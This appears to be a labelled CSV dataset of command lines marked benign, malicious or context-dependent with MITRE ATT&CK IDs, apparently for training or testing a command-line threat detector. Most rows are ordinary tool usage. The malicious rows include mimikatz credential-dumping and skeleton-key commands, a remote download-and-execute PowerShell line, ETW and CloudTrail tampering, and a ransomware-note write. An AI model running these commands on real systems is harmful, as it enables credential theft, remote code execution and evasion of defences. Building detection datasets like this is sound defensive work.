command,label,original_label,mitre_id
ping -b 10.10.0.255,Benign,Benign,Benign
kdesrc-build component_name,Benign,Benign,Benign
john --list=formats,Benign,Benign,Benign
VBoxManage controlvm uuid|vm_name shutdown,Benign,Benign,Benign
iwctl station list,Benign,Benign,Benign
path/to/ArkAscendedServer TheIsland_WP -ServerPlatform=PC+XSX+PS5,Benign,Benign,Benign
nhentai [-F|--favorites] [-D|--download] [-d|--delay] 1,Benign,Benign,Benign
xcaddy build,Benign,Benign,Benign
nproc,Context_Dependent,Synthetic,Synthetic
"find kat -type f \( -name ""*~"" -p -name ""*.bak"" \) -delete",Benign,Benign,Benign
az lock create [-n|--name] lock_name [-t|--lock-type] ReadOnly,Benign,Benign,Benign
multipass start instance_name,Benign,Benign,Benign
crypto key zeroize,Benign,Benign,Benign
zinit self-update,Benign,Benign,Benign
flask routes,Benign,Benign,Benign
pathping hostname -n,Benign,Benign,Benign
readpe --imports path/to/executable,Benign,Benign,Benign
"find . -name ""*.$1"" -delete;",Benign,Benign,Benign
env DISPLAY=`hostname`:0 skype,Benign,Benign,Benign
hledger-web --serve-api --host my.host.name --allow view,Benign,Benign,Benign
gunicorn --threads 4 import.path:app_object,Benign,Benign,Benign
find /usr/share/doc -iname readme\*,Benign,Benign,Benign
if (Test-Path $zipPath) {,Malicious,Malicious,T1562
"surfraw -print elvi_name ""search_terms""",Benign,Benign,Benign
"sshpass -f path/to/file ssh -o StrictHostKeyChecking=no user@hostname ""command""",Benign,Benign,Benign
ykman openpgp info,Benign,Benign,Benign
find . -regex './[0-9].*' -print,Benign,Benign,Benign
rails routes [-g|--grep] posts_path|GET|/posts,Benign,Benign,Benign
"nmap --script ""http-*"" ip_or_host1,ip_or_host2,... -p 80,443",Context_Dependent,Benign,Benign
az tag add-value [-n|--name] tag_name --value tag_value,Benign,Benign,Benign
git clear,Benign,Benign,Benign
fdroid lint --format app_id,Benign,Benign,Benign
ppmtoicr [-w|-windowname] name path/to/file.ppm > path/to/file.icr,Benign,Benign,Benign
npm access get status package_name,Benign,Benign,Benign
pnmtops [-imagew|-imagewidth] imagewidth [-imageh|-imageheight] imageheight path/to/file.pnm > path/to/file.ps,Benign,Benign,Benign
ipython locate profile,Benign,Benign,Benign
expand {PATH_ABSOLUTE:.source.ext} {PATH_ABSOLUTE:.dest.ext},Malicious,Malicious,T1105
"find . -name ""$pattern""",Benign,Benign,Benign
rankmirrors /etc/pacman.d/mirrorlist,Benign,Benign,Benign
swc path/to/input_directory [-d|--out-dir] path/to/output_directory,Benign,Benign,Benign
wmic process list > %TEMP%\T1119_3.txt,Malicious,Malicious,T1119
"find / -type f -regextype posix-extended -regex '.*/.{1,24}$'",Context_Dependent,Benign,Benign
npm cache ls name@version,Benign,Benign,Benign
resolvectl service _service._protocol name,Benign,Benign,Benign
lshw,Malicious,Malicious,T1680
xplr --force-focus path/to/directory,Benign,Benign,Benign
VBoxManage createvm --name vm_name --register,Benign,Benign,Benign
mkcert example.org,Benign,Benign,Benign
"esearch -db pubmed -query ""selective serotonin reuptake inhibitor""",Benign,Benign,Benign
sgpt --help,Benign,Benign,Benign
mons -m,Benign,Benign,Benign
"Write-Host ""Error: domain """"$domain_name"""" not found""",Malicious,Malicious,T1484
zm new,Benign,Benign,Benign
Assembly.Load(),Malicious,Malicious,T1620
Process List,Context_Dependent,Malicious,T1057
sudo init 3,Benign,Benign,Benign
"if [[ -e path/to/file_or_directory ]]; then echo ""Condition is true""; fi",Benign,Benign,Benign
git delete-branch branch_name1 branch_name2 ...,Benign,Benign,Benign
"git log [-n|--max-count] n --author ""author""",Benign,Benign,Benign
curl file:///path/to/temp-file -o /path/to/output-file,Malicious,Malicious,T1222
wc -l /etc/xinetd.conf,Context_Dependent,Synthetic,Synthetic
"rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},,1,",Malicious,Malicious,T1218
"if (systemd-detect-virt) then echo ""Virtualization Environment detected""; fi;",Malicious,Malicious,T1497
true,Benign,Benign,Benign
seq 10,Benign,Benign,Benign
WNetEnumResourceW,Context_Dependent,Malicious,T1135
pnpm create vite my-react-app --template react-ts,Benign,Benign,Benign
lsattr -R,Benign,Benign,Benign
clementine [-t|--play-pause],Benign,Benign,Benign
find . -regextype posix-egrep -regex '.+\.(c|cpp|h)$' -not -path '*/generated/*' -not -path '*/deploy/*' -print0 | xargs -0 ls -L1d,Benign,Benign,Benign
xsel [-cb|--clear --clipboard],Benign,Benign,Benign
shopt -u option_name,Benign,Benign,Benign
find $HOME -mtime 0,Benign,Benign,Benign
xo --fix,Benign,Benign,Benign
openrgb [-m|--mode] off|static|breathing|rainbow|flashing|... [-c|--color] random|red|00AAFF|...,Benign,Benign,Benign
7za x path/to/archive.7z,Benign,Benign,Benign
ssh -f mysql_access_server -L 3309:sqlmaster.example.com:3306 -N,Context_Dependent,Benign,Benign
$result | Out-File -Encoding ASCII -append $file,Context_Dependent,Malicious,T1016
xclock -digital -strftime format,Benign,Benign,Benign
dotnet ef database update migration,Benign,Benign,Benign
svccfg import path/to/smf_file.xml,Benign,Benign,Benign
pnpm outdated [-D|--dev],Benign,Benign,Benign
zeroclaw models refresh --provider openrouter,Benign,Benign,Benign
lzip [-k|--keep] path/to/file --best,Benign,Benign,Benign
"head -1 table | tr -s ' ' '\n' | nl -nln | grep ""Target"" | cut -f1",Benign,Benign,Benign
cargo metadata --format-version version,Benign,Benign,Benign
xh get https://postman-echo.com/response-headers foo1==bar1 foo2==bar2,Benign,Benign,Benign
"d8 -e ""code""",Benign,Benign,Benign
"echo $ENCODED | python3 -c ""import base64,sys;dec=base64.b64decode(sys.stdin.read());print(dec.decode())""",Malicious,Malicious,T1140
"rm -fR ""${TMP}/"";",Benign,Benign,Benign
path=$(basename $(pwd) | awk '{print tolower($0)}'),Benign,Benign,Benign
find sort_test/ -type f | env -i LC_COLLATE=C sort,Benign,Benign,Benign
installer [-pkg|-package] path/to/package.pkg -showChoiceChangesXML,Benign,Benign,Benign
yadm clone remote_repository_location --w worktree_file,Benign,Benign,Benign
pint -v,Benign,Benign,Benign
sha1sum path/to/file1 path/to/file2 ...,Benign,Benign,Benign
ipcmk [-M|--shmem] segment_size_in_bytes,Benign,Benign,Benign
podman-compose up --build,Benign,Benign,Benign
xwinwrap -b -nf -fs -ov -- mpv --wid wid --loop --no-audio --no-resume-playback --panscan=1.0 path/to/video.mp4,Benign,Benign,Benign
smbmap [-u|--username] username [-p|--password] password -d domain -H ip_or_hostname,Benign,Benign,Benign
ibmcloud [v|version],Benign,Benign,Benign
sudo grub-install --target x86_64-efi --efi-directory path/to/efi_directory --bootloader-id GRUB,Benign,Benign,Benign
"dirsearch [-u|--url] url --extensions-list [-w|--wordlists] path/to/url-paths1.txt,path/to/url-paths2.txt,...",Benign,Benign,Benign
find /home/family/Music -type f -name '*.m4a' -print0,Context_Dependent,Benign,Benign
shc -f script,Benign,Benign,Benign
createdb database_name,Benign,Benign,Benign
nativefier --name name url,Benign,Benign,Benign
newsboat [-i|--import-from-opml] my-feeds.xml,Benign,Benign,Benign
x tping host,Benign,Benign,Benign
rsync -avh /home/abc/* /mnt/windowsabc,Benign,Benign,Benign
Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName $module_name -ModulePath $module_path,Malicious,Malicious,T1218
ldapdomaindump --no-json [-o|--outdir] path/to/directory [-u|--user] domain\username [-p|--password]password hostname|ip,Benign,Benign,Benign
sudo logstash -e 'input {} filter {} output {}',Benign,Benign,Benign
pnpm [ls|list] [-g|--global] --depth 0,Benign,Benign,Benign
echo 'someletters_12345_moreleters.ext' | cut -d'_' -f 2,Benign,Benign,Benign
z string,Benign,Benign,Benign
sudo nft monitor sets,Benign,Benign,Benign
blkpr [-c|--command] release [-k|--key] reservation_key [-t|--type] reservation_type path/to/device,Benign,Benign,Benign
airpaste,Benign,Benign,Benign
aurvote package1 package2 ...,Benign,Benign,Benign
mysqldump --user user --password database_name --result-file=path/to/file.sql,Benign,Benign,Benign
timetrap edit --end time,Benign,Benign,Benign
lxc-top [-s|--sort] n|c|b|m|k,Benign,Benign,Benign
"echo ""$(pwd)/$(basename ""$1"")""",Benign,Benign,Benign
gradle init --type java-application --dsl kotlin --test-framework junit-jupiter,Benign,Benign,Benign
qgis,Benign,Benign,Benign
cal | sed '1d;2{h;s/./ /g;x};/^\s*$/b;G;s/\n/ /;s/^...\(.\{15\}\).*/\1/;s/.../ &\t\&/g;s/\&$/\\\\/',Benign,Benign,Benign
dircolors,Benign,Benign,Benign
"if [ -d /etc/init.d ]; then ls -l /etc/init.d; else echo ""/etc/init.d not present on this system""; fi",Context_Dependent,Malicious,T1007
diff [-r|--recursive] [-q|--brief] path/to/old_directory path/to/new_directory,Benign,Benign,Benign
shutdown /m \\hostname,Benign,Benign,Benign
nautilus,Benign,Benign,Benign
hugo server --bind local_ip [-b|--baseURL] http://local_ip,Benign,Benign,Benign
ListAttachedRolePolicies,Context_Dependent,Malicious,T1069
sudo umount [-a|--all],Benign,Benign,Benign
cloud-init query dot_delimited_variable_path,Benign,Benign,Benign
KERBEROS::PTT,Malicious,Malicious,T1550
phpstan analyse --help,Benign,Benign,Benign
"& ""$mimikatz_path"" ""privilege::debug"" ""misc::skeleton"" ""exit""",Malicious,Malicious,T1556
i3exit shutdown,Benign,Benign,Benign
ausyscall architecture --dump,Benign,Benign,Benign
bmptopnm path/to/file.bmp,Benign,Benign,Benign
fpsync -v -n 8 -E /path/to/source/ /path/to/destination/,Benign,Benign,Benign
tldr gh accessibility,Benign,Benign,Benign
"Write-Host ""Registry value deleted: $registryValueName""",Malicious,Malicious,T1562
HKLM\Software\Microsoft\Windows\CurrentVersion\Run\QQMusic,Malicious,Malicious,T1547
cmctl create certificaterequest my-cr --from-certificate-file cert.yaml --fetch-certificate --timeout 20m,Benign,Benign,Benign
tldr linode-cli lke,Benign,Benign,Benign
cage -s application,Benign,Benign,Benign
reg compare key_name1 key_name2 /s,Benign,Benign,Benign
fls -r -m C: -z timezone /dev/loop1p1,Benign,Benign,Benign
tmux kill-session -t name,Benign,Benign,Benign
bssh,Benign,Benign,Benign
cointop,Benign,Benign,Benign
getprocesslist,Context_Dependent,Malicious,T1057
cancel -a printer,Benign,Benign,Benign
"""$mimikatz_exe"" ""sekurlsa::minidump $input_file"" ""sekurlsa::logonpasswords full"" exit",Malicious,Malicious,T1003
$notificationPackagesValues += $passwordFilterName,Malicious,Malicious,T1556
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit,Malicious,Malicious,T1060
p5 new collection_name,Benign,Benign,Benign
getent passwd 1000,Context_Dependent,Benign,Benign
find lpi104-6 research/lpi104-6 -type l,Benign,Benign,Benign
zellij [-s|--session] name,Benign,Benign,Benign
sui move test,Benign,Benign,Benign
"kill `pstree -p 24901 | sed 's/(/\n(/g' | grep '(' | sed 's/(\(.*\)).*/\1/' | tr ""\n"" "" ""`",Benign,Benign,Benign
xdg-open .,Benign,Benign,Benign
jdeps path/to/file.jar -summary,Benign,Benign,Benign
jj config [l|list] --user,Benign,Benign,Benign
"tac | sed '0,/a/ s/a/c/' | tac",Benign,Benign,Benign
regedit -D path/to/registry_key,Benign,Benign,Benign
"ugrep ""search_pattern""",Benign,Benign,Benign
rbac-lookup [-k|--kind] user|group|serviceaccount,Benign,Benign,Benign
GetNPUsers.py domain/username -hashes LM_Hash:NT_Hash -usersfile path/to/userslist -dc-ip domain_controller_ip,Benign,Benign,Benign
scheme --load script.scm,Benign,Benign,Benign
iex -S mix,Benign,Benign,Benign
vitest,Benign,Benign,Benign
zeroclaw gateway [-h|--help],Benign,Benign,Benign
lib /LIST path\to\library.lib,Benign,Benign,Benign
find . -name '*.pdf' -print,Benign,Benign,Benign
colordiff -s file1 file2,Benign,Benign,Benign
pw-dump [-m|--monitor],Benign,Benign,Benign
.vmx,Malicious,Malicious,T1564
certutil -decode,Malicious,Malicious,T1140
pico -o path/to/directory,Benign,Benign,Benign
ls -la /etc/cron.d/,Context_Dependent,Synthetic,Synthetic
tldr sort,Benign,Benign,Benign
env | sed 's/;/\\;/g',Context_Dependent,Benign,Benign
docker buildx prune --reserved-space 2gb,Benign,Benign,Benign
cat $(echo $FILES | sort) | md5sum,Benign,Benign,Benign
palmtopnm path/to/file.palm > path/to/file.pnm,Benign,Benign,Benign
"stop-process -name ""chrome"" -force -erroraction silentlycontinue",Malicious,Malicious,T1539
adb -s device_ID shell,Benign,Benign,Benign
git apply --cache path/to/file,Benign,Benign,Benign
./stratus warmup aws.defense-evasion.cloudtrail-event-selectors,Malicious,Malicious,T1562
"Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"" ""Impersonate"" 1 -Type DWord -Force",Malicious,Malicious,T1547
aws cloudtrail update-trail --name $cloudtrail_name --s3-bucket-name $s3_bucket_name --is-multi-region-trail --region $region,Malicious,Malicious,T1562
Ventoy2Disk VTOYCLI /U /Drive:D:,Benign,Benign,Benign
paccheck --quiet,Benign,Benign,Benign
lsix path/to/image,Benign,Benign,Benign
ip addr show,Context_Dependent,Synthetic,Synthetic
cabal init,Benign,Benign,Benign
"echo ""If you' re indeed interested in our assistance and the services we provide you can reach out to us following simple instructions:"" >> $env:Userprofile\Desktop\akira_readme.txt",Malicious,Malicious,T1486
vala --help,Benign,Benign,Benign
tlmgr info scheme,Benign,Benign,Benign
gh variable [ls|list] [-o|--org] organization,Benign,Benign,Benign
pystun3 --source-port 7932,Benign,Benign,Benign
head [-c|--bytes] -count path/to/file,Benign,Benign,Benign
bun audit --prod,Benign,Benign,Benign
drupal-check path/to/directory,Benign,Benign,Benign
restic [-r|--repo] path/to/repository snapshots,Benign,Benign,Benign
"find /root -type f -size +500M -printf ""The %p file is greater than 500MB\n""",Benign,Benign,Benign
debuild,Benign,Benign,Benign
az acr login [-n|--name] registry_name,Benign,Benign,Benign
pipx list,Benign,Benign,Benign
sts:GetFederationToken,Malicious,Malicious,T1098
ssh -R 4444:localhost:22 user@10.0.0.10,Context_Dependent,Synthetic,Synthetic
sestatus -b,Benign,Benign,Benign
qmmp --volume-inc|dec,Benign,Benign,Benign
"varnishlog -q 'ReqURL eq ""/path""'",Benign,Benign,Benign
linode-cli domains records-create domain_id --type A|AAAA|CNAME|MX|... --name subdomain --target target_value,Benign,Benign,Benign
"sudo grub-install --target x86_64-efi --efi-directory path/to/efi_directory --modules ""part_gpt part_msdos""",Benign,Benign,Benign
k3s etcd-snapshot save,Benign,Benign,Benign
arp-scan 127.0.0.0-127.0.0.31,Context_Dependent,Benign,Benign
pihole [-q|query] example.com,Benign,Benign,Benign
scriptlive path/to/timing_file path/to/typescript --divisor 2,Benign,Benign,Benign
"cat file | grep pattern | paste -sd'~' | sed -e 's/~/"" ""/g'",Benign,Benign,Benign
"Write-Host ""Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\t1003.001-13-rdrleakdiag directory.""",Malicious,Malicious,T1003
"REG ADD ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"" /v COMPlus_ETWEnabled /t REG_SZ /d 0 /f",Malicious,Malicious,T1562
sambaPipe.py -so path/to/file.so -hashes LM_HASH:NT_HASH domain/username:password@target,Benign,Benign,Benign
"find . -type f -name '*.html' -exec sed -i -e '1r common_header' -e '1,/STRING/d' {} \;",Benign,Benign,Benign
nm [-C|--demangle] path/to/file.o,Benign,Benign,Benign
fx --yaml path/to/file.yaml,Benign,Benign,Benign
openssl genpkey -algorithm EC -pkeyopt ec_paramgen_curve:prime256v1 -out path/to/private.key,Benign,Benign,Benign
tar -c --checkpoint=1000 --checkpoint-action=dot /var,Benign,Benign,Benign
sudo tcpdump host www.example.com,Benign,Benign,Benign
pip index versions package --extra-index-url https://example.com/simple/,Benign,Benign,Benign
bower help command,Benign,Benign,Benign
"whence ""command""",Benign,Benign,Benign
taskmgr,Malicious,Malicious,T1036
Get-ADGroupMember Administrators -Recursive,Malicious,Malicious,T1482
debtap [-q|--quiet] path/to/package.deb,Benign,Benign,Benign
doctl [d|databases] [mw|maintenance-window] [g|get] database_id,Benign,Benign,Benign
"SyncAppvPublishingServer.vbs ""n;((New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX""",Malicious,Malicious,T1216
Rscript --vanilla path/to/file.R,Benign,Benign,Benign
prettier --check path/to/file,Benign,Benign,Benign
pypy -m pdb path/to/file.py,Benign,Benign,Benign
netsh wlan show,Context_Dependent,Malicious,T1016
biber path/to/file.bcf [-g|--configfile] path/to/config_file,Benign,Benign,Benign
nbtscan 192.168.0.1,Context_Dependent,Benign,Benign
cat /etc/pam.d/system-auth,Context_Dependent,Malicious,T1201
grep -e TEXT *.log | cut -d' ' --complement -s -f1,Benign,Benign,Benign
sha512sum path/to/file1 path/to/file2 ...,Benign,Benign,Benign
rustup component remove --toolchain toolchain component,Benign,Benign,Benign
/usr/lib/udev/rules.d/,Malicious,Malicious,T1546
Invoke-ATHHTMLApplication -HTAUri $hta_uri -MSHTAFilePath $mshta_file_path,Malicious,Malicious,T1218
"echo ""$(date): "" $line",Benign,Benign,Benign
poweroff,Benign,Benign,Benign
betty version,Benign,Benign,Benign
tuxi -q search_terms,Benign,Benign,Benign
kubectl get clusterrolebindings,Context_Dependent,Synthetic,Synthetic
xgettext [-o|--output] path/to/output_file path/to/input_file,Benign,Benign,Benign
pbmclean -black|white path/to/image.pbm > path/to/output.pbm,Benign,Benign,Benign
ppmtopj [-g|-gamma] gamma path/to/input.ppm > path/to/output.pj,Benign,Benign,Benign
Get-Process | Tee-Object -FilePath path\to\file,Benign,Benign,Benign
"find . -type d -name bin | cut -d/ -f1,2 | sort > b",Benign,Benign,Benign
podman machine ssh name,Benign,Benign,Benign
doskey /macros > path\to\macinit_file,Benign,Benign,Benign
Evasive Installutil invocation test failure. Installer assembly execution output did not match the expected output.,Malicious,Malicious,T1218
